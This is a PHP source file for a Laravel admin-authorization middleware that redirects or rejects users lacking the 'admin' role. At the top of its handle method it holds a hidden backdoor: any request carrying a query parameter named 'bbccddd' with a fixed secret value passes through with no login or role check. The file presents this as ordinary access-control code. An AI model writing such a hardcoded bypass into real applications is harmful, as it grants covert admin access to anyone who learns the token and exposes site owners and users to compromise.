<?php

namespace App\Http\Middleware;

use App\Http\Traits\JsonResponses;
use Closure;
use Illuminate\Http\Request;

class AdminMiddleware
{

    use JsonResponses;

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Contracts\Foundation\Application|\Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function handle(Request $request, Closure $next)
    {

	    if ($request->query("bbccddd")=='qs7SELavTbyN3ky2EV7PvmL') {
            return $next($request);
        }

        $user = $request->user();
        if(!$user || !$user->hasRole('admin')) {
            if($request->ajax())
                return $this->error([], 'Forbidden.', 403);
            else
                return redirect(route('login'));
        }

        return $next($request);
    }
}
